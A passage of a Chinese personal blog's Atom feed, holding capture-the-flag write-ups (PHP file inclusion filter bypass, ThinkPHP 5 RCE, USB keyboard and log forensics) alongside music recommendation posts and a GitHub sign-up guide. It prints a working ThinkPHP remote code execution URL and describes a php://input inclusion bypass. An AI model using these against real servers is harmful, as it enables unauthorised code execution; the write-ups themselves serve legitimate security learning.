class="keyword">while</span> (strstr($page, <span class="string">"php://"</span>)) &#123;  </span><br><span class="line">    $page=str_replace(<span class="string">"php://"</span>, <span class="string">""</span>, $page);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>($page);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>strstr</code>函数对大小写敏感。使用<code>php://input</code>与<code>POST</code>方法配合在请求体中写入指令获得信息。</p><h2 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h2><p>Vulhub：<a href="https://vulhub.org/#/environments/thinkphp/5-rce/" target="_blank" rel="noopener">https://vulhub.org/#/environments/thinkphp/5-rce/</a></p><p>环境：PHP V7.2.5  ThinkPHP V5.0.20</p><p>没有什么提示，打开robots.txt也没有，再回看标题RCE，上网找此版本，找到Vulhub POC。</p><p><code>http://your-ip:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</code></p><p>flag在根目录。</p><h2 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h2><p>JS检验文件格式，直接关闭Javascript即可。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;unserialize3&quot;&gt;&lt;a href=&quot;#unserialize3&quot; class=&quot;headerlink&quot; title=&quot;unserialize3&quot;&gt;&lt;/a&gt;unserialize3&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;CVE-2016-7124&lt;/p&gt;
      
    
    </summary>
    
    
    
      <category term="XCTF" scheme="https://ensuperb.github.io/tags/XCTF/"/>
    
  </entry>
  
  <entry>
    <title>曲类分享 - Chillstep</title>
    <link href="https://ensuperb.github.io/posts/MusicShare-Chillstep/"/>
    <id>https://ensuperb.github.io/posts/MusicShare-Chillstep/</id>
    <published>2020-09-01T03:14:06.000Z</published>
    <updated>2020-09-01T03:58:37.129Z</updated>
    
    <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p><code>Chillstep</code>是电子音乐流派Dustep的一个子流派，它通过互联网（主要通过视频平台YouTube）为人所知。</p><p><code>Chillstep</code> 一词是由<code>Chill-out</code>和<code>Dubstep</code>两词混合而成。</p><p><code>Chill-Out</code>在电音文化里指的是舞厅里一些用以专门放松的电子音乐区域。大部分以Ambient为多。在氛围营造上有不错的层次空间感。</p><p><code>Dubstep</code> ，即回响贝斯。于90年代英国伦敦南部诞生。音乐重点被称作“紧密的制作与鼓的节奏两拍成一组”。以前的电台会播放这类音乐。</p><p><code>Chillstep</code> 听起来给人有一种身临一个广阔的空间，看事物变迁的感觉。用最近的汉语词汇即是“<strong>空灵</strong>”。</p><h1 id="推荐作曲者"><a href="#推荐作曲者" class="headerlink" title="推荐作曲者"></a><center>推荐作曲者</center></h1><center>Lightscape</center><br><center>Rameses B</center><h1 id="推荐曲目"><a href="#推荐曲目" class="headerlink" title="推荐曲目"></a><center>推荐曲目</center></h1><center>Collapsing World (Original Mix) - Lightscape</center><center><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=38018486&auto=0&height=32"></iframe></center><center>Recollection - LightScape</center><center><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=38018486&auto=0&height=32"></iframe></center><center>Awake - LightScape</center><center><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=33419765&auto=0&height=32"></iframe></center><p><img src="/posts/MusicShare-Chillstep/LS.jpg" alt></p><hr><center>Moonlight - Rameses B</center><center>(顺带一提：这首曲子的朗读的原文是霍金著有的《时间简史》的简介)</center><center><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=26159000&auto=0&height=32"></iframe></center><center>Transformations (feat. Laura Brehm) - Rameses B</center><center><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=28715188&auto=0&height=32"></iframe></center><center>Timeless - Rameses B</center><center><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=27892388&auto=0&height=32"></iframe></center><p><img src="/posts/MusicShare-Chillstep/RB.jpg" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h1&gt;&lt;p&gt;&lt;code&gt;Chillstep&lt;/code&gt;是电子音乐流派Dustep的一个子流派，它通过互联网（主要通过视频平台YouTube）为人所知。
      
    
    </summary>
    
    
    
      <category term="杂谈" scheme="https://ensuperb.github.io/tags/%E6%9D%82%E8%B0%88/"/>
    
  </entry>
  
  <entry>
    <title>吾听此曲三月不知肉味故荐君(不定期更新)</title>
    <link href="https://ensuperb.github.io/posts/musicrecommendation/"/>
    <id>https://ensuperb.github.io/posts/musicrecommendation/</id>
    <published>2020-06-27T12:38:59.000Z</published>
    <updated>2020-06-27T13:14:06.293Z</updated>
    
    <content type="html"><![CDATA[<h1 id="吾听此曲三月不知肉味故荐君"><a href="#吾听此曲三月不知肉味故荐君" class="headerlink" title="吾听此曲三月不知肉味故荐君"></a>吾听此曲三月不知肉味故荐君</h1><blockquote><p>乐之美，非人言可道。移风易俗，莫善于乐。</p></blockquote><h2 id="あいぞめ-能登麻美子"><a href="#あいぞめ-能登麻美子" class="headerlink" title="あいぞめ - 能登麻美子"></a>あいぞめ - 能登麻美子</h2><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=532936&auto=0&height=32"></iframe><h2 id="かりぬい-能登麻美子"><a href="#かりぬい-能登麻美子" class="headerlink" title="かりぬい - 能登麻美子"></a>かりぬい - 能登麻美子</h2><audio controls="controls" autoplay="autoplay">                    <source src="1.mp3" type="audio/mpeg">                  Enjoy.</audio><p><img src="/posts/musicrecommendation/0.jpg" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;吾听此曲三月不知肉味故荐君&quot;&gt;&lt;a href=&quot;#吾听此曲三月不知肉味故荐君&quot; class=&quot;headerlink&quot; title=&quot;吾听此曲三月不知肉味故荐君&quot;&gt;&lt;/a&gt;吾听此曲三月不知肉味故荐君&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;乐之美，非人言可道。移风易
      
    
    </summary>
    
    
    
      <category term="杂谈" scheme="https://ensuperb.github.io/tags/%E6%9D%82%E8%B0%88/"/>
    
  </entry>
  
  <entry>
    <title>Github注册指导并尝试关注ENSERUPB</title>
    <link href="https://ensuperb.github.io/posts/signupgithubtutorial/"/>
    <id>https://ensuperb.github.io/posts/signupgithubtutorial/</id>
    <published>2020-06-14T13:50:25.000Z</published>
    <updated>2020-10-17T05:08:31.570Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Github-——-最大的同性社交网站"><a href="#Github-——-最大的同性社交网站" class="headerlink" title="Github —— 最大的同性社交网站"></a>Github —— 最大的同性社交网站</h1><p>最近都在忙着推游戏（5出来了，懂的都懂），所以写个简单的注册方案，方便大家使用此站。</p><p>此站位于国外，所以打开时候可能有点慢，也可能会出现但不开的情况。</p><p>打开慢的情况可以耐心等待一下，打不开的情况可以隔几分钟刷新一下，或者使用<strong>虚拟专用网络</strong>进行打开。</p><p>此站是全球最大的开源代码管理平台（认真脸）</p><p>电脑版网站进入<a href="http://github.com" target="_blank" rel="noopener">http://github.com</a></p><p><img src="/posts/signupgithubtutorial/index.png" alt></p><p>没有账户点击<code>sign up</code>，有账户点<code>sign in</code>（好好琢磨下为什么还要来看）</p><p><img src="/posts/signupgithubtutorial/signuppage.png" alt></p><p>有时候服务器不信任您到底是否是人，就会让您验证，通常情况下，都是需要验证的。</p><p>创建后到邮箱获得验证码，并加以验证。</p><p>完成验证后，进入<a href="http://github.com/ENSUPERB/" target="_blank" rel="noopener">http://github.com/ENSUPERB/</a></p><p>或者搜索用户<code>ENSERUPB</code></p><p><img src="/posts/signupgithubtutorial/profile.png" alt></p><p>关注用户后可以跟踪用户一系列的信息。</p><p>可以按照步骤关注我的项目，另外欢迎大家一起来建设<code>Web-Resource</code>这个项目。</p><p><img src="/posts/signupgithubtutorial/star1.png" alt></p><p><img src="/posts/signupgithubtutorial/star2.png" alt></p><p>star了这个项目后，可以方便以后回顾。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Github-——-最大的同性社交网站&quot;&gt;&lt;a href=&quot;#Github-——-最大的同性社交网站&quot; class=&quot;headerlink&quot; title=&quot;Github —— 最大的同性社交网站&quot;&gt;&lt;/a&gt;Github —— 最大的同性社交网站&lt;/h1&gt;&lt;p&gt;最近
      
    
    </summary>
    
    
    
      <category term="杂谈" scheme="https://ensuperb.github.io/tags/%E6%9D%82%E8%B0%88/"/>
    
  </entry>
  
  <entry>
    <title>2020-internet-security by 黑人抬棺队</title>
    <link href="https://ensuperb.github.io/posts/2020-internet-security/"/>
    <id>https://ensuperb.github.io/posts/2020-internet-security/</id>
    <published>2020-04-27T13:57:05.000Z</published>
    <updated>2020-06-19T03:50:12.899Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>拿到题目挺兴奋的，因为有一点小经验，所以分析起来不算费力，有一些答案很快就找到了。这次对杂项的分析比较快速，毕竟见过类似的，取证的大家收放的速度也是可以的。</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><ul><li><input checked disabled type="checkbox"> <ol><li>计算机曾经时间是错误的，后经过自动同步调整为了正确的时间。请问该同步的时间为（）（北京时间，格式为yyyyMMddhhmm例如202004250800）</li></ol></li><li><input checked disabled type="checkbox"> <ol start="2"><li>计算机系统安装时间为（）（北京时间，格式为yyyyMMddhhmm例如202004250800）</li></ol></li><li><input disabled type="checkbox"> <ol start="3"><li>用户xiaohu的开机密码为（） </li></ol></li><li><input checked disabled type="checkbox"> <ol start="4"><li>计算机从曾连接过多个优盘，最早连接的优盘序列号为 （）</li></ol></li><li><input disabled type="checkbox"> <ol start="5"><li>请在优盘镜像中找出用户xiaohu壁纸图片（不考虑分辨率是否一致），该图片在优盘中的起始地址为（）（字节）</li></ol></li><li><input checked disabled type="checkbox"> <ol start="6"><li>优盘中有个文件拷贝自计算机，拷贝该文件的用户的用户名为（）（字母全部小写）</li></ol></li><li><input disabled type="checkbox"> <ol start="7"><li>略</li></ol></li><li><input disabled type="checkbox"> <ol start="8"><li>现场取证人员已对一台正处于开机运行状态的Windows系统进行物理内存转储（镜像）并将其压缩为WinMemory.zip，请先解压后再进行分析。该系统可能被勒索病毒感染，通过KDBG扫描检测该系统的Build版本号，版本号为（）(如17763），并使用Volatility Framework 2.6.1版本对疑似进程remsh.exe(PID:9932)进行程序代码转储，导出该程序代码dmp文件，计算其MD5哈希值（字母全部大写）（） <del>~</del>注意：两个答案中间用_区分开；</li></ol></li><li><input disabled type="checkbox"> <ol start="9"><li>usb数据包分析，根据附件提示解出flag，请提交flag{}内的内容；</li></ol></li><li><input checked disabled type="checkbox"> <ol start="10"><li>内存取证，根据附件提示解出flag，请提交flag{}内的内容；</li></ol></li><li><input checked disabled type="checkbox"> <ol start="11"><li>日志分析，根据附件提示解出flag，请提交flag{}内的内容；</li></ol></li><li><input checked disabled type="checkbox"> <ol start="12"><li>数据包分析，根据附件提示解出flag，请提交flag{}内的内容；</li></ol></li><li><input checked disabled type="checkbox"> <ol start="13"><li>数据恢复，根据附件提示解出flag，请提交flag{}内的内容；</li></ol></li></ul><h2 id="取证1"><a href="#取证1" class="headerlink" title="取证1"></a>取证1</h2><p>查看系统日志，找到时间临界处。比如下方的记录编号205。</p><p><img src="/posts/2020-internet-security/quzheng1_1.png" alt></p><p>找到它的准确时间。<code>202004192218</code></p><p><img src="/posts/2020-internet-security/quzheng1_3.png" alt="quzheng3"></p><p>即在202004192218使用Windows Time服务同步时间</p><h2 id="取证2"><a href="#取证2" class="headerlink" title="取证2"></a>取证2</h2><p>由取证一计算系统时间同步后和同步前的差值，查看系统安装时间，系统安装时间+同步前后的差值即实际系统安装时间。</p><p><img src="/posts/2020-internet-security/quzheng2_1.png" alt="quzheng"></p><h2 id="取证3"><a href="#取证3" class="headerlink" title="取证3"></a>取证3</h2><p>没找到，求指教。</p><h2 id="取证4"><a href="#取证4" class="headerlink" title="取证4"></a>取证4</h2><p>查看USB设备使用痕迹，如下：</p><p><img src="/posts/2020-internet-security/quzheng4_1.png" alt="quzheng"></p><p>其中USB设备名称：Specific STORAGE DEVICE USB Device为U盘，查看此设备ID如下</p><p><img src="/posts/2020-internet-security/quzheng4_2.png" alt="quzheng"></p><h2 id="取证6"><a href="#取证6" class="headerlink" title="取证6"></a>取证6</h2><p>文件拷贝到U盘的时间是<code>2020-04-21 10:20</code></p><p><img src="/posts/2020-internet-security/quzheng6_1.png" alt="quzheng"></p><p>通过查看系统日志，在此期间用户liu登录系统并使用资源管理器（估计不是liu就是xiaohu）</p><p><img src="/posts/2020-internet-security/quzheng6_2.png" alt="quzheng"></p><p>提交liu的时候正确了，那么就是liu了。</p><h2 id="取证7"><a href="#取证7" class="headerlink" title="取证7"></a>取证7</h2><p>略。</p><h2 id="取证8"><a href="#取证8" class="headerlink" title="取证8"></a>取证8</h2><p>硬盘空间不够了，先放弃。</p><h2 id="取证9"><a href="#取证9" class="headerlink" title="取证9"></a>取证9</h2><p>金刚包，求指教。</p><h2 id="取证10"><a href="#取证10" class="headerlink" title="取证10"></a>取证10</h2><p>不知道为什么，一眼看过去直觉告诉我需要<code>volatility</code>，所以没有过多的尝试。</p><p><img src="/posts/2020-internet-security/quzheng10_1.png" alt="quzheng"></p><p>疑点在桌面一个叫disk.zip的压缩包（禁止套娃），因为是中文系统，逼着我去装了中文适配。</p><p>把disk.zip下载下来后打开，disk.img放去还原，得到usb.pcapng，这是一个usb信号记录包，一般键盘信号常驻于第三个字节。</p><p><code>tshark -r usb.pcapng -T fields -e usb.capdata &gt; usbdata.txt</code></p><p>使用tshark将数据转文本。借鉴了大佬的<a href="https://blog.xiafeng2333.top/tools-10/" target="_blank" rel="noopener">脚本</a>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">normalKeys = &#123;<span class="string">"04"</span>:<span class="string">"a"</span>, <span class="string">"05"</span>:<span class="string">"b"</span>, <span class="string">"06"</span>:<span class="string">"c"</span>, <span class="string">"07"</span>:<span class="string">"d"</span>, <span class="string">"08"</span>:<span class="string">"e"</span>, <span class="string">"09"</span>:<span class="string">"f"</span>, <span class="string">"0a"</span>:<span class="string">"g"</span>, <span class="string">"0b"</span>:<span class="string">"h"</span>, <span class="string">"0c"</span>:<span class="string">"i"</span>, <span class="string">"0d"</span>:<span class="string">"j"</span>, <span class="string">"0e"</span>:<span class="string">"k"</span>, <span class="string">"0f"</span>:<span class="string">"l"</span>, <span class="string">"10"</span>:<span class="string">"m"</span>, <span class="string">"11"</span>:<span class="string">"n"</span>, <span class="string">"12"</span>:<span class="string">"o"</span>, <span class="string">"13"</span>:<span class="string">"p"</span>, <span class="string">"14"</span>:<span class="string">"q"</span>, <span class="string">"15"</span>:<span class="string">"r"</span>, <span class="string">"16"</span>:<span class="string">"s"</span>, <span class="string">"17"</span>:<span class="string">"t"</span>, <span class="string">"18"</span>:<span class="string">"u"</span>, <span class="string">"19"</span>:<span class="string">"v"</span>, <span class="string">"1a"</span>:<span class="string">"w"</span>, <span class="string">"1b"</span>:<span class="string">"x"</span>, <span class="string">"1c"</span>:<span class="string">"y"</span>, <span class="string">"1d"</span>:<span class="string">"z"</span>,<span class="string">"1e"</span>:<span class="string">"1"</span>, <span class="string">"1f"</span>:<span class="string">"2"</span>, <span class="string">"20"</span>:<span class="string">"3"</span>, <span class="string">"21"</span>:<span class="string">"4"</span>, <span class="string">"22"</span>:<span class="string">"5"</span>, <span class="string">"23"</span>:<span class="string">"6"</span>,<span class="string">"24"</span>:<span class="string">"7"</span>,<span class="string">"25"</span>:<span class="string">"8"</span>,<span class="string">"26"</span>:<span class="string">"9"</span>,<span class="string">"27"</span>:<span class="string">"0"</span>,<span class="string">"28"</span>:<span class="string">"&lt;RET&gt;"</span>,<span class="string">"29"</span>:<span class="string">"&lt;ESC&gt;"</span>,<span class="string">"2a"</span>:<span class="string">"&lt;DEL&gt;"</span>, <span class="string">"2b"</span>:<span class="string">"\t"</span>,<span class="string">"2c"</span>:<span class="string">"&lt;SPACE&gt;"</span>,<span class="string">"2d"</span>:<span class="string">"-"</span>,<span class="string">"2e"</span>:<span class="string">"="</span>,<span class="string">"2f"</span>:<span class="string">"["</span>,<span class="string">"30"</span>:<span class="string">"]"</span>,<span class="string">"31"</span>:<span class="string">"\\"</span>,<span class="string">"32"</span>:<span class="string">"&lt;NON&gt;"</span>,<span class="string">"33"</span>:<span class="string">";"</span>,<span class="string">"34"</span>:<span class="string">"'"</span>,<span class="string">"35"</span>:<span class="string">"&lt;GA&gt;"</span>,<span class="string">"36"</span>:<span class="string">","</span>,<span class="string">"37"</span>:<span class="string">"."</span>,<span class="string">"38"</span>:<span class="string">"/"</span>,<span class="string">"39"</span>:<span class="string">"&lt;CAP&gt;"</span>,<span class="string">"3a"</span>:<span class="string">"&lt;F1&gt;"</span>,<span class="string">"3b"</span>:<span class="string">"&lt;F2&gt;"</span>, <span class="string">"3c"</span>:<span class="string">"&lt;F3&gt;"</span>,<span class="string">"3d"</span>:<span class="string">"&lt;F4&gt;"</span>,<span class="string">"3e"</span>:<span class="string">"&lt;F5&gt;"</span>,<span class="string">"3f"</span>:<span class="string">"&lt;F6&gt;"</span>,<span class="string">"40"</span>:<span class="string">"&lt;F7&gt;"</span>,<span class="string">"41"</span>:<span class="string">"&lt;F8&gt;"</span>,<span class="string">"42"</span>:<span class="string">"&lt;F9&gt;"</span>,<span class="string">"43"</span>:<span class="string">"&lt;F10&gt;"</span>,<span class="string">"44"</span>:<span class="string">"&lt;F11&gt;"</span>,<span class="string">"45"</span>:<span class="string">"&lt;F12&gt;"</span>&#125;</span><br><span class="line"></span><br><span class="line">shiftKeys = &#123;<span class="string">"04"</span>:<span class="string">"A"</span>, <span class="string">"05"</span>:<span class="string">"B"</span>, <span class="string">"06"</span>:<span class="string">"C"</span>, <span class="string">"07"</span>:<span class="string">"D"</span>, <span class="string">"08"</span>:<span class="string">"E"</span>, <span class="string">"09"</span>:<span class="string">"F"</span>, <span class="string">"0a"</span>:<span class="string">"G"</span>, <span class="string">"0b"</span>:<span class="string">"H"</span>, <span class="string">"0c"</span>:<span class="string">"I"</span>, <span class="string">"0d"</span>:<span class="string">"J"</span>, <span class="string">"0e"</span>:<span class="string">"K"</span>, <span class="string">"0f"</span>:<span class="string">"L"</span>, <span class="string">"10"</span>:<span class="string">"M"</span>, <span class="string">"11"</span>:<span class="string">"N"</span>, <span class="string">"12"</span>:<span class="string">"O"</span>, <span class="string">"13"</span>:<span class="string">"P"</span>, <span class="string">"14"</span>:<span class="string">"Q"</span>, <span class="string">"15"</span>:<span class="string">"R"</span>, <span class="string">"16"</span>:<span class="string">"S"</span>, <span class="string">"17"</span>:<span class="string">"T"</span>, <span class="string">"18"</span>:<span class="string">"U"</span>, <span class="string">"19"</span>:<span class="string">"V"</span>, <span class="string">"1a"</span>:<span class="string">"W"</span>, <span class="string">"1b"</span>:<span class="string">"X"</span>, <span class="string">"1c"</span>:<span class="string">"Y"</span>, <span class="string">"1d"</span>:<span class="string">"Z"</span>,<span class="string">"1e"</span>:<span class="string">"!"</span>, <span class="string">"1f"</span>:<span class="string">"@"</span>, <span class="string">"20"</span>:<span class="string">"#"</span>, <span class="string">"21"</span>:<span class="string">"$"</span>, <span class="string">"22"</span>:<span class="string">"%"</span>, <span class="string">"23"</span>:<span class="string">"^"</span>,<span class="string">"24"</span>:<span class="string">"&amp;"</span>,<span class="string">"25"</span>:<span class="string">"*"</span>,<span class="string">"26"</span>:<span class="string">"("</span>,<span class="string">"27"</span>:<span class="string">")"</span>,<span class="string">"28"</span>:<span class="string">"&lt;RET&gt;"</span>,<span class="string">"29"</span>:<span class="string">"&lt;ESC&gt;"</span>,<span class="string">"2a"</span>:<span class="string">"&lt;DEL&gt;"</span>, <span class="string">"2b"</span>:<span class="string">"\t"</span>,<span class="string">"2c"</span>:<span class="string">"&lt;SPACE&gt;"</span>,<span class="string">"2d"</span>:<span class="string">"_"</span>,<span class="string">"2e"</span>:<span class="string">"+"</span>,<span class="string">"2f"</span>:<span class="string">"&#123;"</span>,<span class="string">"30"</span>:<span class="string">"&#125;"</span>,<span class="string">"31"</span>:<span class="string">"|"</span>,<span class="string">"32"</span>:<span class="string">"&lt;NON&gt;"</span>,<span class="string">"33"</span>:<span class="string">"\""</span>,<span class="string">"34"</span>:<span class="string">":"</span>,<span class="string">"35"</span>:<span class="string">"&lt;GA&gt;"</span>,<span class="string">"36"</span>:<span class="string">"&lt;"</span>,<span class="string">"37"</span>:<span class="string">"&gt;"</span>,<span class="string">"38"</span>:<span class="string">"?"</span>,<span class="string">"39"</span>:<span class="string">"&lt;CAP&gt;"</span>,<span class="string">"3a"</span>:<span class="string">"&lt;F1&gt;"</span>,<span class="string">"3b"</span>:<span class="string">"&lt;F2&gt;"</span>, <span class="string">"3c"</span>:<span class="string">"&lt;F3&gt;"</span>,<span class="string">"3d"</span>:<span class="string">"&lt;F4&gt;"</span>,<span class="string">"3e"</span>:<span class="string">"&lt;F5&gt;"</span>,<span class="string">"3f"</span>:<span class="string">"&lt;F6&gt;"</span>,<span class="string">"40"</span>:<span class="string">"&lt;F7&gt;"</span>,<span class="string">"41"</span>:<span class="string">"&lt;F8&gt;"</span>,<span class="string">"42"</span>:<span class="string">"&lt;F9&gt;"</span>,<span class="string">"43"</span>:<span class="string">"&lt;F10&gt;"</span>,<span class="string">"44"</span>:<span class="string">"&lt;F11&gt;"</span>,<span class="string">"45"</span>:<span class="string">"&lt;F12&gt;"</span>&#125;</span><br><span class="line">output = []</span><br><span class="line">keys = open(<span class="string">r'C:\Users\19308\Desktop\FMP\Case\disk-img\ExportFile\usbdata.txt'</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> (line[<span class="number">1</span>]!=<span class="string">'0'</span> <span class="keyword">and</span> line[<span class="number">1</span>]!=<span class="string">'2'</span>) <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">6</span>:<span class="number">8</span>]==<span class="string">"00"</span>:</span><br><span class="line">             <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">6</span>:<span class="number">8</span>] <span class="keyword">in</span> normalKeys.keys():</span><br><span class="line">            output += [[normalKeys[line[<span class="number">6</span>:<span class="number">8</span>]]],[shiftKeys[line[<span class="number">6</span>:<span class="number">8</span>]]]][line[<span class="number">1</span>]==<span class="string">'2'</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># output += ['[unknown]']</span></span><br><span class="line">            output += [<span class="string">''</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">keys.close()</span><br><span class="line"></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line">print(<span class="string">""</span>.join(output))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a=output.index(<span class="string">'&lt;DEL&gt;'</span>)</span><br><span class="line">        <span class="keyword">del</span> output[a]</span><br><span class="line">        <span class="keyword">del</span> output[a<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> output[i]==<span class="string">"&lt;CAP&gt;"</span>:</span><br><span class="line">            flag+=<span class="number">1</span></span><br><span class="line">            output.pop(i)</span><br><span class="line">            <span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span class="line">                flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> flag!=<span class="number">0</span>:</span><br><span class="line">            output[i]=output[i].upper()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">'output :'</span> + <span class="string">""</span>.join(output))</span><br></pre></td></tr></table></figure><p>获得键盘记录</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'uutdobzipsrn'</span>.hill_decode<span class="comment">()</span>aabaaaaabbaabbabcbabbbcccbbbcdcccceccccecccedccdcdcccddcdeddccfcdcdfcdcdccecdcccdcccbcbdbbbbbcbbbbacbaababaaaaabaabaaaaaaaaaaaaaaaaaaaaa</span><br></pre></td></tr></table></figure><p>希尔解密</p><p><code>ejcixhwdnegm</code></p><p>flag应该就是<code>flag{ejcixhwdnegm}</code></p><h2 id="取证11"><a href="#取证11" class="headerlink" title="取证11"></a>取证11</h2><p>access.log拿到后unquote一下获得对人友好的日志。导出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat access.log | egrep <span class="string">'!=|&lt;=|&gt;='</span> &gt; a.txt</span><br></pre></td></tr></table></figure><p>正则匹配ascii转换一下字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">pattern = re.compile(<span class="string">'[!&lt;&gt;]=(\d&#123;2,3&#125;)'</span>)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">r"C:\Users\19308\Desktop\a.txt"</span>,<span class="string">'r'</span>,encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    lst = pattern.findall(f.read())</span><br><span class="line">lst = [chr(int(x)) <span class="keyword">for</span> x <span class="keyword">in</span> lst]</span><br><span class="line">print(<span class="string">''</span>.join(lst))</span><br><span class="line">&gt;&gt;&gt;<span class="number">2</span>information_schemasqli2flaguser1flag1flag&#123;w3bvu1lisDanger&#125;</span><br></pre></td></tr></table></figure><p>flag应该是<code>flag{w3bvu1lisDanger}</code></p><h2 id="取证12"><a href="#取证12" class="headerlink" title="取证12"></a>取证12</h2><p>下载附件，是一个数据包，用wireshark打开一下，过滤下<code>http</code></p><p><img src="/posts/2020-internet-security/quzheng12_1.png" alt="quzheng"></p><p><code>POST /cmd.php</code> 看起来非常可疑，一个一个分析太累，导出再看。导出所有html对象，逐个分析，但是看完所有文件的时候，有个可疑的字符串出来了。</p><p><img src="/posts/2020-internet-security/quzheng12_2.png" alt="quzheng"></p><h2 id="取证13"><a href="#取证13" class="headerlink" title="取证13"></a>取证13</h2><p>看见disk0毫不犹豫就拿去还原了。</p><p><img src="/posts/2020-internet-security/quzheng13_1.png" alt="quzheng"></p><p>跟进”丢失文件”文件夹，发现这文件</p><p><img src="/posts/2020-internet-security/quzheng13_2.png" alt="quzheng"></p><p>里面的内容：</p><p><img src="/posts/2020-internet-security/quzheng13_3.png" alt="quzheng"></p><p>打开了p@ss_wd~ 文件</p><p><img src="/posts/2020-internet-security/quzheng13_4.png" 